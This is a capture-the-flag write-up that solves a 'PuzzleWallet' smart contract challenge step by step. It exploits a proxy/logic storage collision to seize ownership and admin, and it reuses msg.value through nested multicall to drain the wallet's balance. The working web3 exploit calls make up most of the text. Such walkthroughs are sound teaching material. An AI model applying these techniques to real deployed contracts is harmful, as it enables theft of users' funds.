# Claim ownership of contract

To claim ownership and drain the wallet, according to the smart contract logic if we somehow become admin of contract we only need to follow these steps >> become owner of contract >> whitelist ourself >> `deposit` to become eligible to withdraw >> exploit `multicall` to drain contract balance.

The solution will be broken down into these sections: <br/>
A. Become owner of contract <br/>
B. WhiteList ourself <br/>
C. Drain Contract's balance <br/>
D. Become admin of contract

## Section A
This challenge contains 2 contract. 1 is [upgrade proxy](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies), another 1 is logic contract of PuzzleWallet.

To modify the `owner` to our address, our main target is:
```
function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
```
How can we modify `proposeNewAdmin` to change `owner`?

The contract having a [storage collision](https://coinsbench.com/upgradability-patterns-in-solidity-part-1-13e23ce1f144) between proxy and logic contract. We can put the 2 contract and their respective storage slot side by side for comparison:
| slot | PuzzleProxy - PuzzleWallet |
| -- | ---------- |
| 0 | pendingAdmin - owner |
| 1 | admin - maxBalance |
| ... | ..... |

This contract is vulnerable if we using `delegatecall` to invoke `pendingAdmin`. We can overwrite `owner` variable stored in slot 0. We can encode signature of function call and send transaction to contract to expose `proposeNewAdmin`.
```
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: instance, data})
```

We are now owner of contract:
```
await contract.owner()
// Output: YOUR_ADDRESS
```
## Section B
To `execute` and withdraw money, we need to check this modifier:
```
modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }
```

Which means we need to access this first:
```
function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

```
Since we are owner, we can whitelist by:
```
await contract..addToWhitelist(player)
```
## Section C
To withdraw balance from contract, only method is `execute`. However the contract track our balance by allowing you to withdraw what you deposited only. 

Looking at `multicall`:
```
assembly {
    selector := mload(add(_data, 32))
}
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```
This function is written to batch multiple transactions into one mainly to save gas costs, can we exploit it?

`multicall` extracts function selector (first 4 bytes from signaure) of data and make check the deposit once per transaction.

What if we call multiple `multicall` that each call `deposit` once? So if we deposit `1 eth`, we able to call two times and `balances[player]` would register `2eth` instead.
```
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)

// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
```

Now we call `multicall` taking the variable "multicallData":
```
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```

Now our balance should be double what we deposited. We can `execute` to take out balance and verify the balance:
```
await contract.execute(player, toWei('0.002'), 0x0)

await getBalance(contract.address)
// Output: '0'
```

## Section D
Looking back at storage collision table, we need to access `maxBalance` to overwrite `admin`. 

`maxBalance` can only be modify through this function:
```
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
  require(address(this).balance == 0, "Contract balance is not 0");
  maxBalance = _maxBalance;
}
```
Which requires `balance == 0` thats why this is our final step, we need to drain the wallet before overwritting `admin`. 

Since we've done the pre-requisites at Section C that clears the balance to 0, we can just call `setMaxBalance` to set `maxBalance` to our address:
```
await contract.setMaxBalance(player)
```

